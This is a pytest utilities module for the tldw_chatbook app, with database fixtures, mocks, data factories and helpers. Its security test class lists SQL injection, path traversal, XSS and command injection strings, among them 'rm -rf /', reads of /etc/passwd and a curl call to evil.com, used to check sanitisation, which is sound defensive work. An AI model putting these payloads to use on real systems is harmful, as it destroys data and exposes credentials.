"""
test_utilities.py
-----------------

Comprehensive test utilities for the tldw_chatbook test suite.
Provides standardized fixtures, mocks, and helpers for testing.

This module includes:
- Database test fixtures (in-memory SQLite setup)
- Mock app configuration patterns
- Common test data factories
- Async test helpers
- File system test utilities (temp directories, mock files)
- API response mocking patterns
- Security testing utilities
"""

import pytest
import pytest_asyncio
import tempfile
import shutil
import json
import asyncio
from pathlib import Path
from typing import Dict, List, Any, Optional, Callable, Type, TypeVar, Generator
from unittest.mock import MagicMock, AsyncMock, patch, mock_open
from contextlib import contextmanager, asynccontextmanager
from datetime import datetime, timezone
import sqlite3
import os
import uuid

# Type variables
T = TypeVar('T')


# ===========================================
# Database Test Fixtures
# ===========================================

@pytest.fixture
def memory_db():
    """Create an in-memory SQLite database for testing."""
    conn = sqlite3.connect(':memory:')
    conn.row_factory = sqlite3.Row
    yield conn
    conn.close()


@pytest.fixture
def temp_db_path(tmp_path):
    """Provide a temporary database file path."""
    db_file = tmp_path / f"test_db_{uuid.uuid4().hex[:8]}.sqlite"
    yield str(db_file)
    # Cleanup happens automatically with tmp_path


@pytest.fixture
def chacha_db_factory(tmp_path):
    """Factory for creating ChaChaNotes database instances."""
    from tldw_chatbook.DB.ChaChaNotes_DB import ChaChaNotes_DB
    
    created_dbs = []
    
    def _create_db(client_id="test_client", db_path=None):
        if db_path is None:
            db_path = str(tmp_path / f"chacha_{uuid.uuid4().hex[:8]}.db")
        
        db = ChaChaNotes_DB(db_path=db_path, client_id=client_id)
        created_dbs.append(db)
        return db
    
    yield _create_db
    
    # Cleanup
    for db in created_dbs:
        try:
            db.close()
        except:
            pass


@pytest.fixture
def media_db_factory(tmp_path):
    """Factory for creating Media database instances."""
    from tldw_chatbook.DB.Client_Media_DB_v2 import MediaDatabase
    
    created_dbs = []
    
    def _create_db(client_id="test_client", db_path=None):
        if db_path is None:
            db_path = str(tmp_path / f"media_{uuid.uuid4().hex[:8]}.db")
        
        db = MediaDatabase(db_path=db_path, client_id=client_id)
        created_dbs.append(db)
        return db
    
    yield _create_db
    
    # Cleanup
    for db in created_dbs:
        try:
            db.close_connection()
        except:
            pass


@pytest.fixture
def rag_db_factory(tmp_path):
    """Factory for creating RAG indexing database instances."""
    from tldw_chatbook.DB.RAG_Indexing_DB import RAGIndexingDatabase
    
    created_dbs = []
    
    def _create_db(db_path=None):
        if db_path is None:
            db_path = str(tmp_path / f"rag_{uuid.uuid4().hex[:8]}.db")
        
        db = RAGIndexingDatabase(db_path=db_path)
        created_dbs.append(db)
        return db
    
    yield _create_db
    
    # Cleanup
    for db in created_dbs:
        try:
            db.close()
        except:
            pass


# ===========================================
# Mock App Configuration
# ===========================================

@pytest.fixture
def mock_app_config():
    """Standard mock app configuration."""
    return {
        "api_endpoints": {
            "openai": {
                "api_key": "test-openai-key",
                "endpoint": "https://api.openai.com/v1",
                "models": ["gpt-3.5-turbo", "gpt-4"]
            },
            "anthropic": {
                "api_key": "test-anthropic-key",
                "endpoint": "https://api.anthropic.com/v1",
                "models": ["claude-3-opus", "claude-3-sonnet"]
            },
            "local": {
                "endpoint": "http://localhost:11434",
                "models": ["llama2", "mistral"]
            }
        },
        "chat_defaults": {
            "temperature": 0.7,
            "max_tokens": 1000,
            "model": "gpt-3.5-turbo",
            "streaming": True
        },
        "ui_settings": {
            "theme": "dark",
            "font_size": 14,
            "show_tooltips": True
        },
        "rag_settings": {
            "enabled": False,
            "chunk_size": 1000,
            "overlap": 200,
            "top_k": 5
        },
        "paths": {
            "data_dir": str(Path.home() / ".tldw_chatbook" / "data"),
            "logs_dir": str(Path.home() / ".tldw_chatbook" / "logs"),
            "media_dir": str(Path.home() / ".tldw_chatbook" / "media")
        }
    }


@pytest.fixture
def mock_tldw_app(mock_app_config):
    """Create a mock TldwCli app instance."""
    app = MagicMock()
    
    # Basic attributes
    app.app_config = mock_app_config
    app.current_chat_is_ephemeral = False
    app.loguru_logger = MagicMock()
    app.title = "TLDW Chatbook Test"
    
    # UI elements
    app.query = MagicMock()
    app.query_one = MagicMock()
    app.notify = MagicMock()
    
    # Async methods
    app.push_screen = AsyncMock()
    app.pop_screen = AsyncMock()
    app.run_worker = AsyncMock()
    app.call_from_thread = MagicMock()
    app.post_message = MagicMock()
    
    # Database connections
    app.chacha_db = MagicMock()
    app.media_db = MagicMock()
    app.rag_db = MagicMock()
    
    return app


# ===========================================
# Test Data Factories
# ===========================================

class TestDataFactory:
    """Factory for creating common test data."""
    
    @staticmethod
    def create_chat_message(role="user", content="Test message", **kwargs):
        """Create a chat message dict."""
        message = {
            "role": role,
            "content": content,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        message.update(kwargs)
        return message
    
    @staticmethod
    def create_conversation(title="Test Conversation", messages=None, **kwargs):
        """Create a conversation dict."""
        if messages is None:
            messages = [
                TestDataFactory.create_chat_message("user", "Hello"),
                TestDataFactory.create_chat_message("assistant", "Hi there!")
            ]
        
        conv = {
            "id": str(uuid.uuid4()),
            "title": title,
            "messages": messages,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "updated_at": datetime.now(timezone.utc).isoformat()
        }
        conv.update(kwargs)
        return conv
    
    @staticmethod
    def create_character(name="Test Character", **kwargs):
        """Create a character dict."""
        character = {
            "id": str(uuid.uuid4()),
            "name": name,
            "description": "A test character for unit testing",
            "personality": "Helpful and friendly",
            "scenario": "Testing environment",
            "greeting": f"Hello! I'm {name}.",
            "examples": [],
            "keywords": ["test", "character"],
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        character.update(kwargs)
        return character
    
    @staticmethod
    def create_note(title="Test Note", **kwargs):
        """Create a note dict."""
        note = {
            "id": str(uuid.uuid4()),
            "title": title,
            "content": "This is test note content.\n\nWith multiple paragraphs.",
            "keywords": ["test", "note"],
            "created_at": datetime.now(timezone.utc).isoformat(),
            "updated_at": datetime.now(timezone.utc).isoformat()
        }
        note.update(kwargs)
        return note
    
    @staticmethod
    def create_media_item(title="Test Media", **kwargs):
        """Create a media item dict."""
        media = {
            "id": str(uuid.uuid4()),
            "title": title,
            "type": "document",
            "content": "Test media content",
            "url": "https://example.com/test.pdf",
            "metadata": {
                "size": 1024,
                "mime_type": "application/pdf"
            },
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        media.update(kwargs)
        return media
    
    @staticmethod
    def create_api_response(provider="openai", success=True, **kwargs):
        """Create a mock API response."""
        if success:
            response = {
                "choices": [{
                    "message": {
                        "role": "assistant",
                        "content": "This is a test response."
                    },
                    "finish_reason": "stop"
                }],
                "usage": {
                    "prompt_tokens": 10,
                    "completion_tokens": 5,
                    "total_tokens": 15
                }
            }
        else:
            response = {
                "error": {
                    "message": "Test error message",
                    "type": "test_error",
                    "code": "test_error_code"
                }
            }
        
        response.update(kwargs)
        return response


@pytest.fixture
def test_data_factory():
    """Provide TestDataFactory instance."""
    return TestDataFactory()


# ===========================================
# Async Test Helpers
# ===========================================

@pytest_asyncio.fixture
async def async_mock_llm_stream():
    """Mock LLM streaming response."""
    async def _stream(chunks: List[str], delay: float = 0.01):
        for chunk in chunks:
            yield chunk
            await asyncio.sleep(delay)
    
    return _stream


@pytest.fixture
def mock_streaming_response():
    """Create a mock streaming response generator."""
    def _create_stream(text: str, chunk_size: int = 10):
        """Split text into chunks and yield them."""
        for i in range(0, len(text), chunk_size):
            yield text[i:i + chunk_size]
    
    return _create_stream


async def wait_for_condition(
    condition: Callable[[], bool],
    timeout: float = 5.0,
    interval: float = 0.1
) -> bool:
    """Wait for a condition to become true."""
    start_time = asyncio.get_event_loop().time()
    
    while not condition():
        if asyncio.get_event_loop().time() - start_time > timeout:
            return False
        await asyncio.sleep(interval)
    
    return True


# ===========================================
# File System Test Utilities
# ===========================================

@pytest.fixture
def temp_dir():
    """Create a temporary directory."""
    temp_path = tempfile.mkdtemp()
    yield Path(temp_path)
    shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture
def mock_file_system(tmp_path):
    """Create a mock file system structure."""
    class MockFileSystem:
        def __init__(self, base_path: Path):
            self.base_path = base_path
            self.files = {}
        
        def create_file(self, path: str, content: str = "") -> Path:
            """Create a file with content."""
            file_path = self.base_path / path
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_text(content)
            self.files[path] = file_path
            return file_path
        
        def create_directory(self, path: str) -> Path:
            """Create a directory."""
            dir_path = self.base_path / path
            dir_path.mkdir(parents=True, exist_ok=True)
            return dir_path
        
        def get_path(self, path: str) -> Path:
            """Get full path for a relative path."""
            return self.base_path / path
    
    return MockFileSystem(tmp_path)


@contextmanager
def mock_open_file(content: str = "", side_effect=None):
    """Mock open() for file operations."""
    if side_effect:
        m = mock_open()
        m.side_effect = side_effect
    else:
        m = mock_open(read_data=content)
    
    with patch('builtins.open', m):
        yield m


# ===========================================
# API Response Mocking
# ===========================================

class MockHTTPResponse:
    """Mock HTTP response for testing."""
    
    def __init__(self, json_data=None, text="", status_code=200, headers=None):
        self.json_data = json_data
        self.text = text
        self.status_code = status_code
        self.headers = headers or {}
    
    def json(self):
        if self.json_data is not None:
            return self.json_data
        raise ValueError("No JSON data")
    
    def raise_for_status(self):
        if 400 <= self.status_code < 600:
            raise Exception(f"HTTP {self.status_code}")


@pytest.fixture
def mock_httpx_client():
    """Mock httpx client for API testing."""
    client = MagicMock()
    
    # Async context manager support
    async def async_enter():
        return client
    
    async def async_exit(*args):
        pass
    
    client.__aenter__ = async_enter
    client.__aexit__ = async_exit
    
    # Default responses
    client.post = AsyncMock(return_value=MockHTTPResponse(
        json_data={"choices": [{"message": {"content": "Test response"}}]}
    ))
    client.get = AsyncMock(return_value=MockHTTPResponse(text="Test content"))
    
    return client


@pytest.fixture
def mock_api_responses():
    """Provide common mock API responses."""
    return {
        "openai_success": {
            "choices": [{
                "message": {"role": "assistant", "content": "Test response"},
                "finish_reason": "stop"
            }],
            "usage": {"total_tokens": 100}
        },
        "openai_error": {
            "error": {
                "message": "Invalid API key",
                "type": "invalid_request_error",
                "code": "invalid_api_key"
            }
        },
        "anthropic_success": {
            "content": [{"type": "text", "text": "Test response"}],
            "stop_reason": "end_turn",
            "usage": {"input_tokens": 50, "output_tokens": 50}
        },
        "anthropic_error": {
            "error": {
                "type": "invalid_request_error",
                "message": "Invalid API key"
            }
        }
    }


# ===========================================
# Security Testing Utilities
# ===========================================

class SecurityTestPatterns:
    """Common security test patterns."""
    
    SQL_INJECTION_ATTEMPTS = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM conversations WHERE 1=1; --",
        "' UNION SELECT * FROM passwords --"
    ]
    
    PATH_TRAVERSAL_ATTEMPTS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "../../../../../../../../etc/hosts"
    ]
    
    XSS_ATTEMPTS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<svg onload=alert('XSS')>"
    ]
    
    COMMAND_INJECTION_ATTEMPTS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "`whoami`",
        "$(curl evil.com/steal)"
    ]


@pytest.fixture
def security_test_patterns():
    """Provide security test patterns."""
    return SecurityTestPatterns()


def assert_input_sanitized(func: Callable, test_inputs: List[str], *args, **kwargs):
    """Assert that a function properly sanitizes dangerous inputs."""
    for dangerous_input in test_inputs:
        try:
            result = func(dangerous_input, *args, **kwargs)
            # Should either sanitize the input or raise an exception
            assert dangerous_input not in str(result), \
                f"Dangerous input not sanitized: {dangerous_input}"
        except (ValueError, TypeError, Exception) as e:
            # Raising an exception is also acceptable
            pass


# ===========================================
# Performance Testing Utilities
# ===========================================

@contextmanager
def measure_time(name: str = "Operation"):
    """Context manager to measure execution time."""
    import time
    start = time.perf_counter()
    yield
    duration = time.perf_counter() - start
    print(f"{name} took {duration:.3f} seconds")


@pytest.fixture
def performance_monitor():
    """Monitor performance metrics during tests."""
    class PerformanceMonitor:
        def __init__(self):
            self.metrics = {}
        
        @contextmanager
        def measure(self, name: str):
            import time
            start = time.perf_counter()
            start_memory = self._get_memory_usage()
            
            yield
            
            duration = time.perf_counter() - start
            end_memory = self._get_memory_usage()
            
            self.metrics[name] = {
                "duration": duration,
                "memory_delta": end_memory - start_memory
            }
        
        def _get_memory_usage(self) -> int:
            """Get current memory usage in bytes."""
            try:
                import psutil
                process = psutil.Process()
                return process.memory_info().rss
            except ImportError:
                return 0
        
        def get_report(self) -> Dict[str, Any]:
            """Get performance report."""
            return self.metrics
    
    return PerformanceMonitor()


# ===========================================
# Common Test Assertions
# ===========================================

def assert_datetime_recent(dt_str: str, max_age_seconds: int = 60):
    """Assert that a datetime string represents a recent time."""
    dt = datetime.fromisoformat(dt_str.replace('Z', '+00:00'))
    now = datetime.now(timezone.utc)
    age = (now - dt).total_seconds()
    assert age <= max_age_seconds, f"Datetime {dt_str} is {age}s old, expected <= {max_age_seconds}s"


def assert_valid_uuid(uuid_str: str):
    """Assert that a string is a valid UUID."""
    try:
        uuid.UUID(uuid_str)
    except ValueError:
        pytest.fail(f"Invalid UUID: {uuid_str}")


def assert_json_equal(actual: Any, expected: Any, ignore_keys: List[str] = None):
    """Assert JSON objects are equal, optionally ignoring certain keys."""
    if ignore_keys:
        def remove_keys(obj):
            if isinstance(obj, dict):
                return {k: remove_keys(v) for k, v in obj.items() if k not in ignore_keys}
            elif isinstance(obj, list):
                return [remove_keys(item) for item in obj]
            return obj
        
        actual = remove_keys(actual)
        expected = remove_keys(expected)
    
    assert actual == expected


# ===========================================
# Cleanup Utilities
# ===========================================

@pytest.fixture
def cleanup_manager():
    """Manage cleanup of resources created during tests."""
    class CleanupManager:
        def __init__(self):
            self._cleanup_funcs = []
        
        def register(self, cleanup_func: Callable):
            """Register a cleanup function."""
            self._cleanup_funcs.append(cleanup_func)
        
        def cleanup(self):
            """Run all cleanup functions."""
            for func in reversed(self._cleanup_funcs):
                try:
                    func()
                except Exception as e:
                    print(f"Cleanup error: {e}")
    
    manager = CleanupManager()
    yield manager
    manager.cleanup()


# ===========================================
# Mock Event System
# ===========================================

class MockEventBus:
    """Mock event bus for testing event-driven components."""
    
    def __init__(self):
        self.events = []
        self.handlers = {}
    
    def post(self, event: Any):
        """Post an event."""
        self.events.append(event)
        event_type = type(event).__name__
        
        if event_type in self.handlers:
            for handler in self.handlers[event_type]:
                handler(event)
    
    def register_handler(self, event_type: str, handler: Callable):
        """Register an event handler."""
        if event_type not in self.handlers:
            self.handlers[event_type] = []
        self.handlers[event_type].append(handler)
    
    def get_events(self, event_type: Optional[str] = None) -> List[Any]:
        """Get posted events, optionally filtered by type."""
        if event_type:
            return [e for e in self.events if type(e).__name__ == event_type]
        return self.events
    
    def clear(self):
        """Clear all events."""
        self.events.clear()


@pytest.fixture
def mock_event_bus():
    """Provide a mock event bus."""
    return MockEventBus()


# ===========================================
# Example Usage Documentation
# ===========================================

"""
Example Usage:

1. Database Testing:
   ```python
   def test_conversation_crud(chacha_db_factory):
       db = chacha_db_factory("test_client")
       conv_id = db.create_conversation("Test Chat")
       assert conv_id is not None
   ```

2. Mock App Testing:
   ```python
   def test_chat_handler(mock_tldw_app, test_data_factory):
       app = mock_tldw_app
       message = test_data_factory.create_chat_message()
       # Test with mock app
   ```

3. Async Testing:
   ```python
   async def test_streaming(async_mock_llm_stream):
       chunks = ["Hello", " ", "World"]
       async for chunk in async_mock_llm_stream(chunks):
           # Process chunk
   ```

4. File System Testing:
   ```python
   def test_file_operations(mock_file_system):
       fs = mock_file_system
       file_path = fs.create_file("test.txt", "content")
       assert file_path.read_text() == "content"
   ```

5. Security Testing:
   ```python
   def test_sql_injection(security_test_patterns):
       for attack in security_test_patterns.SQL_INJECTION_ATTEMPTS:
           # Test that attack is properly handled
   ```

6. Performance Testing:
   ```python
   def test_performance(performance_monitor):
       with performance_monitor.measure("database_query"):
           # Perform operation
       report = performance_monitor.get_report()
   ```
"""